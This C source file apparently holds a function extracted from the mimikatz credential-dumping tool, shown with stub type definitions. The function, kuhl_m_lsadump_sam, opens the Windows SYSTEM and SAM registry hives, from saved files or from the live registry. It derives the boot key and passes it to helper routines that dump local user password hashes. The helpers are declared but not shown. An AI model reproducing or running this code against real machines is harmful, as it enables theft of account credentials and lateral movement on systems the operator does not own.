
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int wchar_t ;
typedef int PKULL_M_REGISTRY_HANDLE ;
typedef int NTSTATUS ;
typedef int * LPCWSTR ;
typedef int * HKEY ;
typedef scalar_t__ HANDLE ;
typedef int BYTE ;


 int CloseHandle (scalar_t__) ;
 scalar_t__ CreateFile (int *,int ,int ,int *,int ,int ,int *) ;
 int FALSE ;
 int FILE_SHARE_READ ;
 int GENERIC_READ ;
 int HKEY_LOCAL_MACHINE ;
 scalar_t__ INVALID_HANDLE_VALUE ;
 int KEY_READ ;
 int KULL_M_REGISTRY_TYPE_HIVE ;
 int KULL_M_REGISTRY_TYPE_OWN ;
 int OPEN_EXISTING ;
 int PRINT_ERROR_AUTO (char*) ;
 int STATUS_SUCCESS ;
 int SYSKEY_LENGTH ;
 scalar_t__ kuhl_m_lsadump_getComputerAndSyskey (int ,int *,int *) ;
 int kuhl_m_lsadump_getUsersAndSamKey (int ,int *,int *) ;
 int kull_m_registry_RegCloseKey (int ,int *) ;
 scalar_t__ kull_m_registry_RegOpenKeyEx (int ,int ,char*,int ,int ,int **) ;
 int kull_m_registry_close (int ) ;
 scalar_t__ kull_m_registry_open (int ,scalar_t__,int ,int *) ;
 scalar_t__ kull_m_string_args_byName (int,int **,char*,int **,int *) ;

NTSTATUS kuhl_m_lsadump_sam(int argc, wchar_t * argv[])
{
 HANDLE hDataSystem, hDataSam;
 PKULL_M_REGISTRY_HANDLE hRegistry, hRegistry2;
 HKEY hBase;
 BYTE sysKey[SYSKEY_LENGTH];
 LPCWSTR szSystem = ((void*)0), szSam = ((void*)0);

 if(kull_m_string_args_byName(argc, argv, L"system", &szSystem, ((void*)0)))
 {
  hDataSystem = CreateFile(szSystem, GENERIC_READ, FILE_SHARE_READ, ((void*)0), OPEN_EXISTING, 0, ((void*)0));
  if(hDataSystem != INVALID_HANDLE_VALUE)
  {
   if(kull_m_registry_open(KULL_M_REGISTRY_TYPE_HIVE, hDataSystem, FALSE, &hRegistry))
   {
    if(kuhl_m_lsadump_getComputerAndSyskey(hRegistry, ((void*)0), sysKey))
    {
     if(kull_m_string_args_byName(argc, argv, L"sam", &szSam, ((void*)0)))
     {
      hDataSam = CreateFile(szSam, GENERIC_READ, FILE_SHARE_READ, ((void*)0), OPEN_EXISTING, 0, ((void*)0));
      if(hDataSam != INVALID_HANDLE_VALUE)
      {
       if(kull_m_registry_open(KULL_M_REGISTRY_TYPE_HIVE, hDataSam, FALSE, &hRegistry2))
       {
        kuhl_m_lsadump_getUsersAndSamKey(hRegistry2, ((void*)0), sysKey);
        kull_m_registry_close(hRegistry2);
       }
       CloseHandle(hDataSam);
      }
      else PRINT_ERROR_AUTO(L"CreateFile (SAM hive)");
     }
    }
    kull_m_registry_close(hRegistry);
   }
   CloseHandle(hDataSystem);
  }
  else PRINT_ERROR_AUTO(L"CreateFile (SYSTEM hive)");
 }
 else
 {
  if(kull_m_registry_open(KULL_M_REGISTRY_TYPE_OWN, ((void*)0), FALSE, &hRegistry))
  {
   if(kull_m_registry_RegOpenKeyEx(hRegistry, HKEY_LOCAL_MACHINE, L"SYSTEM", 0, KEY_READ, &hBase))
   {
    if(kuhl_m_lsadump_getComputerAndSyskey(hRegistry, hBase, sysKey))
    {
     if(kull_m_registry_RegOpenKeyEx(hRegistry, HKEY_LOCAL_MACHINE, L"SAM", 0, KEY_READ, &hBase))
     {
      kuhl_m_lsadump_getUsersAndSamKey(hRegistry, hBase, sysKey);
      kull_m_registry_RegCloseKey(hRegistry, hBase);
     }
     else PRINT_ERROR_AUTO(L"kull_m_registry_RegOpenKeyEx (SAM)");
    }
    kull_m_registry_RegCloseKey(hRegistry, hBase);
   }
   kull_m_registry_close(hRegistry);
  }
 }
 return STATUS_SUCCESS;
}
